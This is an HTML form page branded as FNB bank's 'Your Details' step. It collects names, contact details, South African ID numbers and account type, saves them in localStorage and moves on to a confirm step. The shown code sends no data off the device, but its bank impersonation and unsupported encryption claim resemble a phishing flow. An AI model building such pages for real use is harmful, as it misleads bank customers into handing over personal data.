<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FNB - Your Details</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ffffff 0%, #f0f9ff 30%, #e6f7f6 70%, #ccfbf1 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Background Shapes */
        .bg-shape {
            position: fixed;
            border-radius: 50%;
            opacity: 0.08;
            animation: floatShape 20s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        .bg-shape-1 {
            width: 400px;
            height: 400px;
            background: #00a79d;
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }

        .bg-shape-2 {
            width: 300px;
            height: 300px;
            background: #f5a623;
            bottom: -80px;
            left: -80px;
            animation-delay: -5s;
        }

        .bg-shape-3 {
            width: 200px;
            height: 200px;
            background: #00a79d;
            top: 50%;
            left: 10%;
            animation-delay: -10s;
        }

        @keyframes floatShape {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(30px, -30px) scale(1.05); }
            50% { transform: translate(-20px, 20px) scale(0.95); }
            75% { transform: translate(20px, 30px) scale(1.02); }
        }

        /* Step Indicator */
        .step-indicator {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.1s forwards;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: white;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
            font-size: 0.85rem;
            font-weight: 600;
            color: #94a3b8;
            transition: all 0.4s ease;
        }

        .step.active {
            background: #00a79d;
            color: white;
            box-shadow: 0 8px 25px rgba(0, 167, 157, 0.35);
            transform: scale(1.05);
        }

        .step.completed {
            background: #e6f7f6;
            color: #00a79d;
        }

        .step-number {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: currentColor;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            font-weight: 700;
        }

        .step.active .step-number {
            background: white;
            color: #00a79d;
        }

        .step.completed .step-number {
            background: #00a79d;
            color: white;
        }

        .step-divider {
            width: 30px;
            height: 2px;
            background: #e2e8f0;
            border-radius: 1px;
        }

        /* Logo */
        .logo-container {
            margin-bottom: 25px;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.2s forwards;
        }

        .logo-container img {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            object-fit: cover;
            box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35);
            animation: logoPulse 3s ease-in-out infinite;
            transition: transform 0.4s ease;
        }

        .logo-container img:hover {
            transform: scale(1.1) rotate(5deg);
        }

        @keyframes logoPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35); }
            50% { transform: scale(1.06); box-shadow: 0 20px 60px rgba(0, 167, 157, 0.5); }
        }

        .logo-container h2 {
            margin-top: 12px;
            color: #00a79d;
            font-weight: 800;
            letter-spacing: 4px;
            font-size: 1.6rem;
        }

        /* Card */
        .details-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            padding: 45px 40px;
            border-radius: 28px;
            box-shadow: 
                0 25px 80px rgba(0, 0, 0, 0.08),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
            width: 100%;
            max-width: 550px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInUp 1s ease-out 0.5s forwards;
            transition: transform 0.4s ease, box-shadow 0.4s ease;
        }

        .details-card:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 35px 100px rgba(0, 167, 157, 0.12),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
        }

        .details-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: linear-gradient(90deg, transparent, #00a79d, transparent);
            border-radius: 2px;
            opacity: 0;
            animation: fadeIn 0.6s ease-out 1s forwards;
        }

        .details-card h1 {
            font-size: 1.7rem;
            font-weight: 800;
            color: #0f172a;
            margin-bottom: 12px;
            line-height: 1.3;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 0.8s forwards;
        }

        .details-card .subtitle {
            color: #64748b;
            font-size: 0.95rem;
            margin-bottom: 30px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1s forwards;
        }

        /* Request Summary */
        .request-summary {
            background: linear-gradient(135deg, #e6f7f6 0%, #f0fdfa 100%);
            border: 1px solid #ccfbf1;
            border-radius: 16px;
            padding: 18px 22px;
            margin-bottom: 25px;
            text-align: left;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.1s forwards;
        }

        .request-summary label {
            font-size: 0.75rem;
            font-weight: 700;
            color: #00a79d;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            display: block;
        }

        .request-summary p {
            color: #475569;
            font-size: 0.95rem;
            line-height: 1.5;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }

        /* Form */
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        .form-group {
            text-align: left;
            margin-bottom: 18px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out forwards;
        }

        .form-group:nth-child(1) { animation-delay: 1.2s; }
        .form-group:nth-child(2) { animation-delay: 1.3s; }
        .form-group:nth-child(3) { animation-delay: 1.4s; }
        .form-group:nth-child(4) { animation-delay: 1.5s; }
        .form-group:nth-child(5) { animation-delay: 1.6s; }

        .form-group label {
            display: block;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 8px;
            font-size: 0.9rem;
            transition: color 0.3s ease;
        }

        .form-group:focus-within label {
            color: #00a79d;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            font-family: inherit;
            font-size: 0.95rem;
            color: #0f172a;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            outline: none;
            background: #fafafa;
        }

        .form-group input:focus,
        .form-group select:focus {
            border-color: #00a79d;
            box-shadow: 0 0 0 4px rgba(0, 167, 157, 0.12), 0 4px 20px rgba(0, 167, 157, 0.08);
            background: white;
            transform: translateY(-2px);
        }

        .form-group input::placeholder {
            color: #94a3b8;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00a79d 0%, #008c82 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.7s forwards;
            margin-top: 10px;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.6s ease;
        }

        .submit-btn:hover::before {
            left: 100%;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #008c82 0%, #007a71 100%);
            transform: translateY(-3px);
            box-shadow: 0 15px 45px rgba(0, 167, 157, 0.4);
        }

        .submit-btn:active {
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-loader {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        .submit-btn.loading .btn-loader {
            display: inline-block;
        }

        .submit-btn.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Error Message */
        .error-message {
            display: none;
            padding: 12px 16px;
            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
            border: 1px solid #fecaca;
            border-radius: 12px;
            color: #dc2626;
            font-size: 0.85rem;
            margin-bottom: 18px;
            text-align: left;
            animation: shake 0.5s ease-in-out;
        }

        .error-message.show {
            display: block;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-4px); }
            80% { transform: translateX(4px); }
        }

        /* Back Link */
        .back-link {
            margin-top: 20px;
            color: #64748b;
            font-size: 0.9rem;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            padding: 8px 16px;
            border-radius: 10px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.9s forwards;
        }

        .back-link:hover {
            color: #00a79d;
            background: rgba(0, 167, 157, 0.08);
            transform: translateX(-4px);
        }

        /* Footer Note */
        .footer-note {
            margin-top: 25px;
            color: #94a3b8;
            font-size: 0.8rem;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeIn 1s ease-out 2.1s forwards;
        }

        .footer-note span {
            color: #00a79d;
            font-weight: 600;
        }

        .footer-note .lock-icon {
            display: inline-block;
            animation: lockPulse 2s ease-in-out infinite;
        }

        @keyframes lockPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }

        /* Particles */
        .particle {
            position: fixed;
            width: 6px;
            height: 6px;
            background: rgba(0, 167, 157, 0.2);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: particleFloat 15s ease-in-out infinite;
        }

        @keyframes particleFloat {
            0%, 100% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 600px) {
            .details-card { padding: 35px 25px; }
            .details-card h1 { font-size: 1.4rem; }
            .logo-container img { width: 80px; height: 80px; }
            .form-row { grid-template-columns: 1fr; }
            .step { padding: 8px 14px; font-size: 0.75rem; }
            .step-divider { width: 15px; }
        }
    </style>
</head>
<body>

    <!-- Background Shapes -->
    <div class="bg-shape bg-shape-1"></div>
    <div class="bg-shape bg-shape-2"></div>
    <div class="bg-shape bg-shape-3"></div>

    <!-- Floating Particles -->
    <div class="particle" style="left: 10%; animation-delay: 0s; animation-duration: 12s;"></div>
    <div class="particle" style="left: 25%; animation-delay: 3s; animation-duration: 15s;"></div>
    <div class="particle" style="left: 50%; animation-delay: 6s; animation-duration: 18s;"></div>
    <div class="particle" style="left: 75%; animation-delay: 2s; animation-duration: 14s;"></div>
    <div class="particle" style="left: 90%; animation-delay: 5s; animation-duration: 16s;"></div>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Request</span>
        </div>
        <div class="step-divider"></div>
        <div class="step active">
            <span class="step-number">2</span>
            <span>Details</span>
        </div>
        <div class="step-divider"></div>
        <div class="step">
            <span class="step-number">3</span>
            <span>Confirm</span>
        </div>
        <div class="step-divider"></div>
        <div class="step">
            <span class="step-number">4</span>
            <span>App</span>
        </div>
    </div>

    <!-- Logo -->
    <div class="logo-container">
        <img src="images.png" alt="FNB Logo">
        <h2>FNB</h2>
    </div>

    <!-- Details Card -->
    <div class="details-card">
        <h1>Your Details</h1>
        <p class="subtitle">Please provide your information so we can assist you better.</p>

        <!-- Request Summary -->
        <div class="request-summary">
            <label>Your Request</label>
            <p id="request-preview">Loading...</p>
        </div>

        <div class="error-message" id="error-message"></div>

        <form id="details-form">
            <div class="form-row">
                <div class="form-group">
                    <label for="first-name">First Name *</label>
                    <input type="text" id="first-name" name="first_name" placeholder="John" required>
                </div>
                <div class="form-group">
                    <label for="last-name">Last Name *</label>
                    <input type="text" id="last-name" name="last_name" placeholder="Doe" required>
                </div>
            </div>

            <div class="form-group">
                <label for="email">Email Address *</label>
                <input type="email" id="email" name="email" placeholder="john.doe@email.com" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number *</label>
                <input type="tel" id="phone" name="phone" placeholder="+27 12 345 6789" required>
            </div>

            <div class="form-group">
                <label for="id-number">ID Number</label>
                <input type="text" id="id-number" name="id_number" placeholder="Your South African ID">
            </div>

            <div class="form-group">
                <label for="account-type">Account Type</label>
                <select id="account-type" name="account_type">
                    <option value="">Select account type</option>
                    <option value="personal">Personal Account</option>
                    <option value="business">Business Account</option>
                    <option value="savings">Savings Account</option>
                    <option value="not-sure">Not Sure / New Customer</option>
                </select>
            </div>

            <button type="submit" class="submit-btn" id="submit-btn">
                <span class="btn-loader"></span>
                <span class="btn-text">Continue →</span>
            </button>
        </form>

        <a href="help.html" class="back-link">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
            Back to Request
        </a>
    </div>

    <p class="footer-note">
        <span class="lock-icon">🔒</span> Your information is <span>secure & confidential</span>. Protected by 256-bit encryption.
    </p>

    <script>
        // ===== LOAD SAVED REQUEST =====
        const savedRequest = localStorage.getItem('fnb_user_request');
        const requestPreview = document.getElementById('request-preview');

        if (savedRequest) {
            requestPreview.textContent = savedRequest;
        } else {
            requestPreview.textContent = 'No request found. Please go back and submit your request first.';
            requestPreview.style.color = '#dc2626';
        }

        // ===== FORM HANDLING =====
        const form = document.getElementById('details-form');
        const submitBtn = document.getElementById('submit-btn');
        const errorMessage = document.getElementById('error-message');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const firstName = document.getElementById('first-name').value.trim();
            const lastName = document.getElementById('last-name').value.trim();
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim();

            // Validation
            if (!firstName || !lastName || !email || !phone) {
                errorMessage.textContent = 'Please fill in all required fields.';
                errorMessage.classList.add('show');
                return;
            }

            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                errorMessage.textContent = 'Please enter a valid email address.';
                errorMessage.classList.add('show');
                return;
            }

            // Save to localStorage
            localStorage.setItem('fnb_first_name', firstName);
            localStorage.setItem('fnb_last_name', lastName);
            localStorage.setItem('fnb_email', email);
            localStorage.setItem('fnb_phone', phone);
            localStorage.setItem('fnb_id_number', document.getElementById('id-number').value.trim());
            localStorage.setItem('fnb_account_type', document.getElementById('account-type').value);
            localStorage.setItem('fnb_step2_time', new Date().toISOString());

            // Show loading
            submitBtn.classList.add('loading');
            submitBtn.disabled = true;

            setTimeout(() => {
                window.location.href = 'confirm.html';
            }, 800);
        });

        // Hide error on input
        form.querySelectorAll('input, select').forEach(field => {
            field.addEventListener('input', () => errorMessage.classList.remove('show'));
        });
    </script>

</body>
</html>
